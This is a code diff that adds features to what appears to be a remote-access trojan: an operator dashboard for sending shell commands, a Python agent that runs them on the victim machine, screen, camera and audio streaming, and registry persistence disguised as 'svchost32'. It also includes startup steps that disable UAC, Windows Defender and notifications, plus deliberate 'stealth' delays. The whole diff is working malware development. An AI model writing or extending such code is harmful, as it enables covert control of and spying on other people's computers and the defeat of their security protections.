+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-audio')">
+                    <span>🎤 Start Audio</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-audio')">
+                    <span>⏹ Stop Audio</span>
+                </button>
             </div>
 
             <div class="control-section">
                 <h3>System Commands</h3>
-                <input type="text" id="command-input" class="neural-input" placeholder="Enter command...">
-                <button class="neural-button" onclick="executeCommand()">Execute</button>
-                <button class="neural-button danger" onclick="sendCommand('shutdown')">Shutdown Agent</button>
+                <input type="text" id="command-input" class="neural-input" placeholder="Enter command (e.g., whoami, ipconfig)...">
+                <button class="neural-button" onclick="executeCommand()">
+                    <span>⚡ Execute Command</span>
+                </button>
+                <button class="neural-button danger" onclick="confirmShutdown(this)">
+                    <span>🛑 Shutdown Agent</span>
+                </button>
             </div>
 
             <div class="control-section">
@@ -8188,8 +8499,11 @@ DASHBOARD_HTML = '''
 
         // Socket event handlers
         socket.on('connect', function() {
-            console.log('Connected to controller');
+            console.log('✅ Connected to controller');
+            console.log('📡 Socket ID:', socket.id);
             socket.emit('operator_connect');
+            // Request current agents list
+            socket.emit('get_agents');
         });
 
         socket.on('agents_list', function(data) {
@@ -8201,7 +8515,19 @@ DASHBOARD_HTML = '''
         });
 
         socket.on('command_result', function(data) {
-            displayCommandResult(data.output);
+            console.log('📨 Received command_result:', data);
+            console.log('Selected agent:', selectedAgent);
+            console.log('Data agent_id:', data.agent_id);
+            if (data && data.output) {
+                displayCommandResult(data.output);
+            } else {
+                console.warn('⚠️ No output in command_result');
+            }
+        });
+
+        // Listen for all events (debugging)
+        socket.onAny((eventName, ...args) => {
+            console.log(`📡 Event received: ${eventName}`, args);
         });
 
         socket.on('screen_frame', function(data) {
@@ -8263,14 +8589,88 @@ DASHBOARD_HTML = '''
 
         function sendCommand(command) {
             if (!selectedAgent) {
-                alert('Please select an agent first');
+                showNotification('Please select an agent first', 'error');
                 return;
             }
+            
+            console.log('🚀 Sending command:', command, 'to agent:', selectedAgent);
+            
+            // Show command sent feedback
+            showNotification(`Command sent: ${command}`, 'success');
             
             socket.emit('execute_command', {
                 agent_id: selectedAgent,
                 command: command
             });
+            
+            console.log('✅ execute_command event emitted');
+        }
+
+        function showNotification(message, type = 'info') {
+            // Create notification element
+            const notification = document.createElement('div');
+            notification.className = `notification notification-${type}`;
+            notification.textContent = message;
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                padding: 15px 25px;
+                background: ${type === 'error' ? 'linear-gradient(45deg, #ff4040, #ff6b6b)' : 'linear-gradient(45deg, #00d4ff, #9b59b6)'};
+                color: white;
+                border-radius: 10px;
+                box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+                z-index: 10000;
+                animation: slideIn 0.3s ease, slideOut 0.3s ease 2.7s;
+                font-weight: 600;
+            `;
+            
+            document.body.appendChild(notification);
+            
+            // Remove after 3 seconds
+            setTimeout(() => {
+                notification.remove();
+            }, 3000);
+        }
+
+        // Add animation styles
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideIn {
+                from { transform: translateX(400px); opacity: 0; }
+                to { transform: translateX(0); opacity: 1; }
+            }
+            @keyframes slideOut {
+                from { transform: translateX(0); opacity: 1; }
+                to { transform: translateX(400px); opacity: 0; }
+            }
+            @keyframes buttonPulse {
+                0% { transform: scale(1); }
+                50% { transform: scale(0.95); }
+                100% { transform: scale(1); }
+            }
+        `;
+        document.head.appendChild(style);
+
+        function sendCommandWithFeedback(button, command) {
+            // Animate button
+            button.style.animation = 'buttonPulse 0.3s ease';
+            setTimeout(() => {
+                button.style.animation = '';
+            }, 300);
+            
+            // Send command
+            sendCommand(command);
+        }
+
+        function confirmShutdown(button) {
+            if (confirm('⚠️ Are you sure you want to shutdown the agent?\n\nThis will disconnect the agent from the controller.')) {
+                button.style.animation = 'buttonPulse 0.3s ease';
+                setTimeout(() => {
+                    button.style.animation = '';
+                }, 300);
+                sendCommand('shutdown');
+            }
         }
 
         function executeCommand() {
@@ -8283,13 +8683,26 @@ DASHBOARD_HTML = '''
                 return;
             }
             
+            // Display the command in the output first
+            displayCommandInput(command);
+            
             sendCommand(command);
             commandInput.value = '';
         }
 
+        function displayCommandInput(command) {
+            const commandOutput = document.getElementById('command-output');
+            const timestamp = new Date().toLocaleTimeString();
+            commandOutput.innerHTML += `<span style="color: #00ff88;">[${timestamp}] > ${command}</span>\\n`;
+            commandOutput.scrollTop = commandOutput.scrollHeight;
+        }
+
         function displayCommandResult(output) {
             const commandOutput = document.getElementById('command-output');
-            commandOutput.innerHTML += output + '\\n';
+            const timestamp = new Date().toLocaleTimeString();
+            // Escape HTML and preserve formatting
+            const escapedOutput = output.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+            commandOutput.innerHTML += `<span style="color: #ffffff;">[${timestamp}] ${escapedOutput}</span>\\n\\n`;
             commandOutput.scrollTop = commandOutput.scrollHeight;
         }
 
@@ -8571,6 +8984,100 @@ def disconnect():
         return
     """Handle disconnection from server."""
     log_message("Disconnected from server")
+
+def on_start_stream(data):
+    """Handle start_stream event from controller UI."""
+    if not SOCKETIO_AVAILABLE or sio is None:
+        log_message("Socket.IO not available, cannot handle start_stream", "warning")
+        return
+    
+    agent_id = get_or_create_agent_id()
+    stream_type = data.get('type', 'screen')  # screen, camera, or audio
+    quality = data.get('quality', 'high')
+    
+    log_message(f"[START_STREAM] Received request: type={stream_type}, quality={quality}")
+    
+    try:
+        if stream_type == 'screen':
+            start_streaming(agent_id)
+            log_message(f"[START_STREAM] Screen streaming started")
+            sio.emit('stream_started', {
+                'agent_id': agent_id,
+                'type': 'screen',
+                'status': 'success'
+            })
+        elif stream_type == 'camera':
+            start_camera_streaming(agent_id)
+            log_message(f"[START_STREAM] Camera streaming started")
+            sio.emit('stream_started', {
+                'agent_id': agent_id,
+                'type': 'camera',
+                'status': 'success'
+            })
+        elif stream_type == 'audio':
+            start_audio_streaming(agent_id)
+            log_message(f"[START_STREAM] Audio streaming started")
+            sio.emit('stream_started', {
+                'agent_id': agent_id,
+                'type': 'audio',
+                'status': 'success'
+            })
+        else:
+            log_message(f"[START_STREAM] Unknown stream type: {stream_type}", "warning")
+            sio.emit('stream_error', {
+                'agent_id': agent_id,
+                'type': stream_type,
+                'error': f'Unknown stream type: {stream_type}'
+            })
+    except Exception as e:
+        log_message(f"[START_STREAM] Error starting {stream_type} stream: {e}", "error")
+        sio.emit('stream_error', {
+            'agent_id': agent_id,
+            'type': stream_type,
+            'error': str(e)
+        })
+
+def on_stop_stream(data):
+    """Handle stop_stream event from controller UI."""
+    if not SOCKETIO_AVAILABLE or sio is None:
+        log_message("Socket.IO not available, cannot handle stop_stream", "warning")
+        return
+    
+    agent_id = get_or_create_agent_id()
+    stream_type = data.get('type', 'screen')  # screen, camera, or audio
+    
+    log_message(f"[STOP_STREAM] Received request: type={stream_type}")
+    
+    try:
+        if stream_type == 'screen':
+            stop_streaming()
+            log_message(f"[STOP_STREAM] Screen streaming stopped")
+            sio.emit('stream_stopped', {
+                'agent_id': agent_id,
+                'type': 'screen',
+                'status': 'success'
+            })
+        elif stream_type == 'camera':
+            stop_camera_streaming()
+            log_message(f"[STOP_STREAM] Camera streaming stopped")
+            sio.emit('stream_stopped', {
+                'agent_id': agent_id,
+                'type': 'camera',
+                'status': 'success'
+            })
+        elif stream_type == 'audio':
+            stop_audio_streaming()
+            log_message(f"[STOP_STREAM] Audio streaming stopped")
+            sio.emit('stream_stopped', {
+                'agent_id': agent_id,
+                'type': 'audio',
+                'status': 'success'
+            })
+        else:
+            log_message(f"[STOP_STREAM] Unknown stream type: {stream_type}", "warning")
+    except Exception as e:
+        log_message(f"[STOP_STREAM] Error stopping {stream_type} stream: {e}", "error")
+
 def on_command(data):
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle command", "warning")
@@ -8732,6 +9239,64 @@ def on_command(data):
     
     if output:
         sio.emit('command_result', {'agent_id': agent_id, 'output': output})
+
+def on_execute_command(data):
+    """
+    Handle execute_command event from controller UI v2.1
+    This is separate from on_command to support the new UI terminal
+    """
+    if not SOCKETIO_AVAILABLE or sio is None:
+        log_message("Socket.IO not available, cannot handle execute_command", "warning")
+        return
+    
+    agent_id = data.get('agent_id')
+    command = data.get('command')
+    
+    # Verify this command is for us
+    our_agent_id = get_or_create_agent_id()
+    if agent_id != our_agent_id:
+        return  # Not for this agent
+    
+    log_message(f"[EXECUTE_COMMAND] Received: {command}")
+    
+    # Execute the command using the same logic as on_command
+    output = ""
+    
+    # Add stealth delay
+    sleep_random_non_blocking()
+    
+    internal_commands = {
+        "start-stream": lambda: start_streaming(our_agent_id),
+        "stop-stream": stop_streaming,
+        "start-audio": lambda: start_audio_streaming(our_agent_id),
+        "stop-audio": stop_audio_streaming,
+        "start-camera": lambda: start_camera_streaming(our_agent_id),
+        "stop-camera": stop_camera_streaming,
+        "screenshot": lambda: "Screenshot captured",
+        "systeminfo": lambda: execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a"),
+    }
+    
+    if command in internal_commands:
+        try:
+            output = internal_commands[command]()
+            if output is None:
+                output = f"Command '{command}' executed successfully"
+        except Exception as e:
+            output = f"Error executing '{command}': {e}"
+    else:
+        # Execute as system command
+        try:
+            output = execute_command(command)
+        except Exception as e:
+            output = f"Command execution error: {e}"
+    
+    # Send output back to controller
+    log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars)")
+    sio.emit('command_result', {
+        'agent_id': our_agent_id,
+        'output': output,
+        'timestamp': time.time()
+    })
 
 def on_mouse_move(data):
     if not SOCKETIO_AVAILABLE or sio is None:
@@ -9394,9 +9959,12 @@ def add_registry_startup():
             log_message(f"[INFO] Stealth executable already exists: {stealth_exe_path}")
         
         # Add to registry pointing to the stealth location
+        # IMPORTANT: Do NOT use quotes around the path in registry - it can cause UAC prompts
+        # The executable will run with normal user privileges automatically
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run")
-        winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, f'"{stealth_exe_path}"')
+        # Store without quotes to avoid UAC prompt on startup
+        winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, stealth_exe_path)
         winreg.CloseKey(key)
         
         log_message(f"[OK] Registry persistence established: {stealth_exe_path}")
@@ -9751,6 +10319,35 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 if __name__ == "__main__":
+    # PRIORITY 1: Disable UAC, Defender, and Notifications FIRST
+    try:
+        log_message("[STARTUP] === SYSTEM CONFIGURATION STARTING ===")
+        
+        # 1. Disable UAC first (requires admin)
+        log_message("[STARTUP] Step 1: Disabling UAC...")
+        if disable_uac():
+            log_message("[STARTUP] ✅ UAC disabled successfully")
+        else:
+            log_message("[STARTUP] ⚠️ UAC disable failed (requires admin on first run)")
+        
+        # 2. Disable Windows Defender
+        log_message("[STARTUP] Step 2: Disabling Windows Defender...")
+        if disable_defender():
+            log_message("[STARTUP] ✅ Windows Defender disabled successfully")
+        else:
+            log_message("[STARTUP] ⚠️ Defender disable failed")
+        
+        # 3. Disable Windows notifications
+        log_message("[STARTUP] Step 3: Disabling Windows notifications...")
+        if disable_windows_notifications():
+            log_message("[STARTUP] ✅ Notifications disabled successfully")
+        else:
+            log_message("[STARTUP] ⚠️ Notification disable failed")
+        
+        log_message("[STARTUP] === SYSTEM CONFIGURATION COMPLETE ===")
+    except Exception as e:
+        log_message(f"[STARTUP] Configuration error: {e}", "warning")
+    
     # Initialize basic stealth mode
     try:
         sleep_random_non_blocking()  # Add random delay
